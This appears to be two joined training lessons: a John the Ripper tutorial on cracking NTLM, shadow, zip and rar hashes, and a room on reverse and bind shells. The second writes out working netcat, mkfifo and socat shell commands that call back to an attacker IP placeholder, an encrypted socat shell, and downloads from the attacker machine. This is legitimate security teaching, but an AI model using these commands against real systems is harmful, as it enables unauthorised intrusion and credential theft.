Sometimes John won't play nicely with automatically recognising and loading hashes, that's okay! We're able to use other tools to identify the hash, and then set john to use a specific format. There are multiple ways to do this, such as using an online hash identifier like this one. I like to use a tool called hash-identifier, a Python tool that is super easy to use and will tell you what different types of hashes the one you enter is likely to be, giving you more options if the first one fails.</p>
<p>To use hash-identifier, you can just pull the python file from gitlab using: wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py.</p>
<p>Then simply launch it with python3 hash-id.py and then enter the hash you're trying to identify- and it will give you possible formats!</p>
<p>Format-Specific Cracking
Once you have identified the hash that you're dealing with, you can tell john to use it while cracking the provided hash using the following syntax:</p>
<p>john --format=[format] --wordlist=[path to wordlist] [path to file]</p>
<p>--format= - This is the flag to tell John that you're giving it a hash of a specific format, and to use the following format to crack it</p>
<p>[format] - The format that the hash is in</p>
<p>Example Usage:</p>
<p>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt</p>
<p>A Note on Formats:</p>
<p>When you are telling john to use formats, if you're dealing with a standard hash type, e.g. md5 as in the example above, you have to prefix it with raw- to tell john you're just dealing with a standard hash type, though this doesn't always apply. To check if you need to add the prefix or not, you can list all of John's formats using john --list=formats and either check manually, or grep for your hash type using something like john --list=formats | grep -iF &quot;md5&quot;.</p>
<p>Practical
Now you know the syntax, modifiers and methods to crack basic hashes, try it yourself! Download the attached .txt files that</p>
<p>Cracking Windows Hashes
Now that we understand the basic syntax and usage of John the Ripper- lets move on to cracking something a little bit more difficult, something that you may even want to attempt if you're on a real Penetration Test or Red Team engagement. Authentication hashes are the hashed versions of passwords that are stored by operating systems, it is sometimes possible to crack them using the brute-force methods that we're using. To get your hands on these hashes, you must often already be a privileged user- so we will explain some of the hashes that we plan on cracking as we attempt them.</p>
<p>NTHash / NTLM
NThash is the hash format that modern Windows Operating System machines will store user and service passwords in. It's also commonly referred to as &quot;NTLM&quot; which references the previous version of Windows format for hashing passwords known as &quot;LM&quot;, thus &quot;NT/LM&quot;.</p>
<p>A little bit of history, the NT designation for Windows products originally meant &quot;New Technology&quot;, and was used- starting with Windows NT, to denote products that were not built up from the MS-DOS Operating System. Eventually, the &quot;NT&quot; line became the standard Operating System type to be released by Microsoft and the name was dropped, but it still lives on in the names of some Microsoft technologies. </p>
<p>You can acquire NTHash/NTLM hashes by dumping the SAM database on a Windows machine, by using a tool like Mimikatz or from the Active Directory database: NTDS.dit. You may not have to crack the hash to continue privilege escalation- as you can often conduct a &quot;pass the hash&quot; attack instead, but sometimes hash cracking is a viable option if there is a weak password policy.</p>
<p>Practical
Now that you know the theory behind it, see if you can use the techniques we practiced in the last task, and the knowledge of what type of hash this is to crack the ntlm.txt file!</p>
<p>Cracking Hashes from /etc/shadow
The /etc/shadow file is the file on Linux machines where password hashes are stored. It also stores other information, such as the date of last password change and password expiration information. It contains one entry per line for each user or user account of the system. This file is usually only accessible by the root user- so in order to get your hands on the hashes you must have sufficient privileges, but if you do- there is a chance that you will be able to crack some of the hashes.</p>
<p>Unshadowing
John can be very particular about the formats it needs data in to be able to work with it, for this reason- in order to crack /etc/shadow passwords, you must combine it with the /etc/passwd file in order for John to understand the data it's being given. To do this, we use a tool built into the John suite of tools called unshadow. The basic syntax of unshadow is as follows:</p>
<p>unshadow [path to passwd] [path to shadow]</p>
<p>unshadow - Invokes the unshadow tool</p>
<p>[path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine</p>
<p>[path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine</p>
<p>Example Usage:</p>
<p>unshadow local_passwd local_shadow &gt; unshadowed.txt</p>
<p>Note on the files</p>
<p>When using unshadow, you can either use the entire /etc/passwd and /etc/shadow file- if you have them available, or you can use the relevant line from each, for example:</p>
<p>FILE 1 - local_passwd</p>
<p>Contains the /etc/passwd line for the root user:</p>
<p>root:x:0:0::/root:/bin/bash</p>
<p>FILE 2 - local_shadow</p>
<p>Contains the /etc/shadow line for the root user:</p>
<p>root:$6$2nwjN454g.dv4HN/$m9Z/r2xVfweYVkrr.v5Ft8Ws3/YYksfNwq96UL1FX0OJjY1L6l.DS3KEVsZ9rOVLB/ldTeEL/OIhJZ4GMFMGA0:18576::::::</p>
<p>Cracking
We're then able to feed the output from unshadow, in our example use case called &quot;unshadowed.txt&quot; directly into John. We should not need to specify a mode here as we have made the input specifically for John, however in some cases you will need to specify the format as we have done previously using: --format=sha512crypt</p>
<p>john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt</p>
<p>Practical
Now, see if you can follow the process to crack the password hash of the root user that is provided in the &quot;etchashes.txt&quot; file. Good luck!</p>
<p>Single Crack Mode
So far we've been using John's wordlist mode to deal with brute forcing simple., and not so simple hashes. But John also has another mode, called Single Crack mode. In this mode, John uses only the information provided in the username, to try and work out possible passwords heuristically, by slightly changing the letters and numbers contained within the username.</p>
<p>Word Mangling
The best way to show what Single Crack mode is,  and what word mangling is, is to actually go through an example:</p>
<p>If we take the username: Markus</p>
<p>Some possible passwords could be:</p>
<p>Markus1, Markus2, Markus3 (etc.)
MArkus, MARkus, MARKus (etc.)
Markus!, Markus$, Markus* (etc.)
This technique is called word mangling. John is building it's own dictionary based on the information that it has been fed and uses a set of rules called &quot;mangling rules&quot; which define how it can mutate the word it started with to generate a wordlist based off of relevant factors for the target you're trying to crack. This is exploiting how poor passwords can be based off of information about the username, or the service they're logging into.</p>
<p>GECOS
John's implementation of word mangling also features compatibility with the Gecos fields of the UNIX operating system, and other UNIX-like operating systems such as Linux. So what are Gecos? Remember in the last task where we were looking at the entries of both /etc/shadow and /etc/passwd? Well if you look closely You can see that each field is seperated by a colon &quot;:&quot;. Each one of the fields that these records are split into are called Gecos fields. John can take information stored in those records, such as full name and home directory name to add in to the wordlist it generates when cracking /etc/shadow hashes with single crack mode.</p>
<p>Using Single Crack Mode
To use single crack mode, we use roughly the same syntax that we've used to so far, for example if we wanted to crack the password of the user named &quot;Mike&quot;, using single mode, we'd use:</p>
<p>john --single --format=[format] [path to file]</p>
<p>--single - This flag lets john know you want to use the single hash cracking mode.</p>
<p>Example Usage:</p>
<p>john --single --format=raw-sha256 hashes.txt</p>
<p>A Note on File Formats in Single Crack Mode:</p>
<p>If you're cracking hashes in single crack mode, you need to change the file format that you're feeding john for it to understand what data to create a wordlist from. You do this by prepending the hash with the username that the hash belongs to, so according to the above example- we would change the file hashes.txt</p>
<p>From:</p>
<p>1efee03cdcb96d90ad48ccc7b8666033</p>
<p>To</p>
<p>mike:1efee03cdcb96d90ad48ccc7b8666033</p>
<p>Practical
Now you're familiar with the Syntax for John's single crack mode, download the attached hash and crack it, assuming that the user it belongs to is called &quot;Joker&quot;.</p>
<p>What are Custom Rules?
As we journeyed through our exploration of what John can do in Single Crack Mode- you may have some ideas about what some good mangling patterns would be, or what patterns your passwords often use- that could be replicated with a certain mangling pattern. The good news is you can define your own sets of rules, which John will use to dynamically create passwords. This is especially useful when you know more information about the password structure of whatever your target is.</p>
<p>Common Custom Rules
Many organisations will require a certain level of password complexity to try and combat dictionary attacks, meaning that if you create an account somewhere, go to create a password and enter:</p>
<p>polopassword</p>
<p>You may receive a prompt telling you that passwords have to contain at least one of the following:</p>
<p>Capital letter
Number
Symbol
This is good! However, we can exploit the fact that most users will be predictable in the location of these symbols. For the above criteria, many users will use something like the following:</p>
<p>Polopassword1!</p>
<p>A password with the capital letter first, and a number followed by a symbol at the end. This pattern of the familiar password, appended and prepended by modifiers (such as the capital letter or symbols) is a memorable pattern that people will use, and reuse when they create passwords. This pattern can let us exploit password complexity predictability.</p>
<p>Now this does meet the password complexity requirements, however as an attacker we can exploit the fact we know the likely position of these added elements to create dynamic passwords from our wordlists.</p>
<p>How to create Custom Rules
Custom rules are defined in the john.conf file, usually located in /etc/john/john.conf if you have installed John using a package manager or built from source with make and in /opt/john/john.conf on the TryHackMe Attackbox.</p>
<p>Let's go over the syntax of these custom rules, using the example above as our target pattern. Note that there is a massive level of granular control that you can define in these rules, I would suggest taking a look at the wiki here in order to get a full view of the types of modifier you can use, as well as more examples of rule implementation.</p>
<p>The first line:</p>
<p>[List.Rules:THMRules] - Is used to define the name of your rule, this is what you will use to call your custom rule as a John argument.</p>
<p>We then use a regex style pattern match to define where in the word will be modified, again- we will only cover the basic and most common modifiers here:</p>
<p>Az - Takes the word and appends it with the characters you define</p>
<p>A0 - Takes the word and prepends it with the characters you define</p>
<p>c - Capitalises the character positionally</p>
<p>These can be used in combination to define where and what in the word you want to modify.</p>
<p>Lastly, we then need to define what characters should be appended, prepended or otherwise included, we do this by adding character sets in square brackets [ ] in the order they should be used. These directly follow the modifier patterns inside of double quotes &quot; &quot;. Here are some common examples:</p>
<p>[0-9] - Will include numbers 0-9</p>
<p>[0] - Will include only the number 0</p>
<p>[A-z] - Will include both upper and lowercase</p>
<p>[A-Z] - Will include only uppercase letters</p>
<p>[a-z] - Will include only lowercase letters</p>
<p>[a] - Will include only a</p>
<p>[!£$%@] - Will include the symbols !£$%@</p>
<p>Putting this all together, in order to generate a wordlist from the rules that would match the example password &quot;Polopassword1!&quot; (assuming the word polopassword was in our wordlist) we would create a rule entry that looks like this:</p>
<p>[List.Rules:PoloPassword]</p>
<p>cAz&quot;[0-9] [!£$%@]&quot;</p>
<p>In order to:</p>
<p>Capitalise the first  letter - c</p>
<p>Append to the end of the word - Az</p>
<p>A number in the range 0-9 - [0-9]</p>
<p>Followed by a symbol that is one of [!£$%@]</p>
<p>Using Custom Rules
We could then call this custom rule as a John argument using the  --rule=PoloPassword flag.</p>
<p>As a full command: john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]</p>
<p>As a note I find it helpful to talk out the patterns if you're writing a rule- as shown above, the same applies to writing RegEx patterns too.</p>
<p>Jumbo John already comes with a large list of custom rules, which contain modifiers for use almost all cases. If you get stuck, try looking at those rules [around line 678] if your syntax isn't working properly.</p>
<p>Now, time for you to have a go!</p>
<p>Cracking a Password Protected Zip File
Yes! You read that right. We can use John to crack the password on password protected Zip files. Again, we're going to be using a separate part of the john suite of tools to convert the zip file into a format that John will understand, but for all intents and purposes, we're going to be using the syntax that you're already pretty familiar with by now.</p>
<p>Zip2John
Similarly to the unshadow tool that we used previously, we're going to be using the zip2john tool to convert the zip file into a hash format that John is able to understand, and hopefully crack. The basic usage is like this:</p>
<p>zip2john [options] [zip file] &gt; [output file]</p>
<p>[options] - Allows you to pass specific checksum options to zip2john, this shouldn't often be necessary</p>
<p>[zip file] - The path to the zip file you wish to get the hash of</p>
<blockquote>
<ul>
<li>This is the output director, we're using this to send the output from this file to the...</li>
</ul>
</blockquote>
<p>[output file] - This is the file that will store the output from</p>
<p>Example Usage</p>
<p>zip2john zipfile.zip &gt; zip_hash.txt</p>
<p>Cracking
We're then able to take the file we output from zip2john in our example use case called &quot;zip_hash.txt&quot; and, as we did with unshadow, feed it directly into John as we have made the input specifically for it.</p>
<p>john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt</p>
<p>Practical
Now have a go at cracking the attached &quot;secure&quot; zip file!</p>
<p>Cracking a Password Protected RAR Archive
We can use a similar process to the one we used in the last task to obtain the password for rar archives. If you aren't familiar, rar archives are compressed files created by the Winrar archive manager. Just like zip files they compress a wide variety of folders and files.</p>
<p>Rar2John
Almost identical to the zip2john tool that we just used, we're going to use the rar2john tool to convert the rar file into a hash format that John is able to understand. The basic syntax is as follows:</p>
<p>rar2john [rar file] &gt; [output file]</p>
<p>rar2john - Invokes the rar2john tool</p>
<p>[rar file] - The path to the rar file you wish to get the hash of</p>
<blockquote>
<ul>
<li>This is the output director, we're using this to send the output from this file to the...</li>
</ul>
</blockquote>
<p>[output file] - This is the file that will store the output from
Example Usage</p>
<p>rar2john rarfile.rar &gt; rar_hash.txt</p>
<p>Cracking
Once again, we're then able to take the file we output from rar2john in our example use case called &quot;rar_hash.txt&quot; and, as we did with zip2john we can feed it directly into John..</p>
<p>john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt</p>

<p>There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell. We will discuss each of these briefly below:</p>
<p>Netcat:</p>
<p>Netcat is the traditional &quot;Swiss Army Knife&quot; of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.</p>
<p>Socat:</p>
<p>Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:</p>
<p>The syntax is more difficult
Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.
There are work arounds to both of these problems, which we will cover later on.</p>
<p>Both Socat and Netcat have .exe versions for use on Windows.</p>
<p>Metasploit -- multi/handler:</p>
<p>The exploit/multi/handler module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads -- both of which we will look at in task 9.</p>
<p>Msfvenom:</p>
<p>Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room. Msfvenom is an incredibly powerful tool, so we will go into its application in much more detail in a dedicated task.</p>
<p>Aside from the tools we've already covered, there are some repositories of shells in many different languages. One of the most prominent of these is Payloads all the Things. The PentestMonkey Reverse Shell Cheatsheet is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at /usr/share/webshells. The SecLists repo, though primarily used for wordlists, also contains some very useful code for obtaining shells.</p>
<p>At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells.</p>
<p>Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.
Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
As a general rule, reverse shells are easier to execute and debug, however, we will cover both examples below. Don't worry too much about the syntax here: we will be looking at it in upcoming tasks. Instead notice the difference between reverse and bind shells in the following simulations.</p>
<p>Reverse Shell example:</p>
<p>Let's start with the more common reverse shell.</p>
<p>Nine times out of ten, this is what you'll be going for -- especially in CTF challenges like those of TryHackMe.</p>
<p>Take a look at the following image. On the left we have a reverse shell listener -- this is what receives the connection. On the right is a simulation of sending a reverse shell. In reality, this is more likely to be done through code injection on a remote website or something along those lines. Picture the image on the left as being your own computer, and the image on the right as being the target.</p>
<p>On the attacking machine:</p>
<p>sudo nc -lvnp 443</p>
<p>On the target:</p>
<p>nc <LOCAL-IP> <PORT> -e /bin/bash</p>
<p>Notice that after running the command on the right, the listener receives a connection. When the whoami command is run, we see that we are executing commands as the target user. The important thing here is that we are listening on our own attacking machine, and sending a connection from the target.</p>
<p>Bind Shell example:
Bind shells are less common, but still very useful.</p>
<p>Once again, take a look at the following image. Again, on the left we have the attacker's computer, on the right we have a simulated target. Just to shake things up a little, we'll use a Windows target this time. First, we start a listener on the target -- this time we're also telling it to execute cmd.exe. Then, with the listener up and running, we connect from our own machine to the newly opened port.</p>
<p>On the target:</p>
<p>nc -lvnp <port> -e &quot;cmd.exe&quot;</p>
<p>On the attacking machine:</p>
<p>nc MACHINE_IP <port></p>
<p>As you can see, this once again gives us code execution on the remote machine. Note that this is not specific to Windows.</p>
<p>The important thing to understand here is that we are listening on the target, then connecting to it with our own machine.</p>
<p>The final concept which is relevant in this task is that of interactivity. Shells can be either interactive or non-interactive.</p>
<p>Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to
interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:</p>
<p>Here you can see that it's asking interactively that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.</p>
<p>Non-Interactive shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:</p>
<p>Notice that the whoami command (which is non-interactive) executes perfectly, but the ssh command (which is interactive) gives us no output at all. As an interesting side note, the output of an interactive command does go somewhere, however, figuring out where is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.
Additionally, in various places throughout this task you will see a command in the screenshots called listener. This command is an alias unique to the attacking machine used for demonstrations, and is a shorthand way of typing sudo rlwrap nc -lvnp 443, which will be covered in upcoming tasks. It will not work on any other machine unless the alias has been configured locally.</p>
<p>As mentioned previously, Netcat is the most basic tool in a pentester's toolkit when it comes to any kind of networking. With it we can do a wide variety of interesting things, but let's focus for now on shells.</p>
<p>Reverse Shells</p>
<p>In the previous task we saw that reverse shells require shellcode and a listener. There are many ways to execute a shell, so we'll start by looking at listeners.</p>
<p>The syntax for starting a netcat listener using Linux is this:</p>
<p>nc -lvnp <port-number></p>
<p>-l is used to tell netcat that this will be a listener
-v is used to request a verbose output
-n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
-p indicates that the port specification will follow.
The example in the previous task used port 443. Realistically you could use any port you like, as long as there isn't already a service using it. Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.</p>
<p>A working example of this would be:</p>
<p>sudo nc -lvnp 443</p>
<p>We can then connect back to this with any number of payloads, depending on the environment on the target.</p>
<p>An example of this is displayed in the previous task.</p>
<p>Bind Shells</p>
<p>If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. The syntax for this is relatively straight forward:</p>
<p>nc <target-ip> <chosen-port></p>
<p>Here we are using netcat to make an outbound connection to the target on our chosen port.</p>
<p>We will look at using netcat to create a listener for this type of shell in Task 8. What's important here is that you understand how to connect to a listening port using netcat.</p>
<p>Ok, so we've caught or connected to a netcat shell, what next?</p>
<p>These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat &quot;shells&quot; really being processes running inside a terminal, rather than being bonafide terminals in their own right. Fortunately, there are many ways to stabilise netcat shells on Linux systems. We'll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we'll be covering here is particularly useful for it.</p>
<p>Technique 1: Python</p>
<p>The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:</p>
<p>The first thing to do is use python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)', which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
Step two is: export TERM=xterm -- this will give us access to term commands such as clear.
Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
The full technique can be seen here:</p>
<p>Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.</p>
<p>Technique 2: rlwrap</p>
<p>rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with sudo apt install rlwrap.</p>
<p>To use rlwrap, we invoke a slightly different listener:</p>
<p>rlwrap nc -lvnp <port></p>
<p>Prepending our netcat listener with &quot;rlwrap&quot; gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell.</p>
<p>Technique 3: Socat</p>
<p>The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (sudo python3 -m http.server 80), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (wget <LOCAL-IP>/socat -O /tmp/socat).</p>
<p>For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows\temp\socat.exe). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.</p>
<p>With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.</p>
<p>First, open another terminal and run stty -a. This will give you a large stream of output. Note down the values for &quot;rows&quot; and columns:</p>
<p>Next, in your reverse/bind shell, type in:</p>
<p>stty rows <number></p>
<p>and</p>
<p>stty cols <number></p>
<p>Filling in the numbers you got from running the command in your own terminal.</p>
<p>This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.</p>
<p>Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!</p>
<p>Once again, let's start with reverse shells.</p>
<p>Reverse Shells</p>
<p>As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:</p>
<p>socat TCP-L:<port> -</p>
<p>As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to nc -lvnp <port>.</p>
<p>On Windows we would use this command to connect back:</p>
<p>socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes</p>
<p>The &quot;pipes&quot; option is used to force powershell (or cmd.exe) to use Unix style standard input and output.</p>
<p>This is the equivalent command for a Linux Target:</p>
<p>socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:&quot;bash -li&quot;</p>
<p>Bind Shells</p>
<p>On a Linux target we would use the following command:</p>
<p>socat TCP-L:<PORT> EXEC:&quot;bash -li&quot;</p>
<p>On a Windows target we would use this command for our listener:</p>
<p>socat TCP-L:<PORT> EXEC:powershell.exe,pipes</p>
<p>We use the &quot;pipes&quot; argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.</p>
<p>Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.</p>
<p>socat TCP:<TARGET-IP>:<TARGET-PORT> -</p>
<p>Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is significantly more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:</p>
<p>socat TCP-L:<port> FILE:<code>tty</code>,raw,echo=0</p>
<p>Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.</p>
<p>The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.</p>
<p>The special command is as follows:</p>
<p>socat TCP:<attacker-ip>:<attacker-port> EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</p>
<p>This is a handful, so let's break it down.</p>
<p>The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:&quot;bash -li&quot;. We're also passing the arguments: pty, stderr, sigint, setsid and sane:</p>
<p>pty, allocates a pseudoterminal on the target -- part of the stabilisation process
stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
setsid, creates the process in a new session
sane, stabilises the terminal, attempting to &quot;normalise&quot; it.
That's a lot to take in, so let's see it in action.</p>
<p>As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:</p>
<p>Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.</p>
<p>If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command. This is very useful for experimental purposes, but is not usually necessary for general use.</p>
<p>One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.</p>
<p>We covered how to create basic shells in the previous task, so that syntax will not be covered again here. Suffice to say that any time TCP was used as part of a command, this should be replaced with OPENSSL when working with encrypted shells. We'll cover a few examples at the end of the task, but first let's talk about certificates.</p>
<p>We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:</p>
<p>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</p>
<p>This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
We then need to merge the two created files into a single .pem file:</p>
<p>cat shell.key shell.crt &gt; shell.pem</p>
<p>Now, when we set up our reverse shell listener, we use:</p>
<p>socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -</p>
<p>This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.</p>
<p>To connect back, we would use:</p>
<p>socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash</p>
<p>The same technique would apply for a bind shell:</p>
<p>Target:</p>
<p>socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</p>
<p>Attacker:</p>
<p>socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -</p>
<p>Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.</p>
<p>The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:</p>
<p>This technique will also work with the special, Linux-only TTY shell covered in the previous task -- figuring out the syntax for this will be the challenge for this task. Feel free to use the Linux Practice box (deployable at the end of the room) to experiment if you're struggling to obtain the answer.</p>

<p>Common Shell Payloads
We'll soon be looking at generating payloads with msfvenom, but before we do that, let's take a look at some common payloads using the tools we've already covered.</p>
<p>A previous task mentioned that we'd be looking at some ways to use netcat as a listener for a bindshell, so we'll start with that. In some versions of netcat (including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries, and the version used in Kali itself: netcat-traditional) there is a -e option which allows you to execute a process on connection. For example, as a listener:</p>
<p>nc -lvnp <PORT> -e /bin/bash</p>
<p>Connecting to the above listener with netcat would result in a bind shell on the target.</p>
<p>Equally, for a reverse shell, connecting back with nc <LOCAL-IP> <PORT> -e /bin/bash would result in a reverse shell on the target.</p>
<p>However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:</p>
<p>mkfifo /tmp/f; nc -lvnp <PORT> &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</p>
<p>The following paragraph is the technical explanation for this command. It's slightly above the level of this room, so don't worry if it doesn't make much sense for now -- the command itself is what matters.</p>
<p>The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.</p>
<p>A very similar command can be used to send a netcat reverse shell:</p>
<p>mkfifo /tmp/f; nc <LOCAL-IP> <PORT> &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</p>
<p>This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.</p>
<p>When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.</p>
<p>This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:</p>
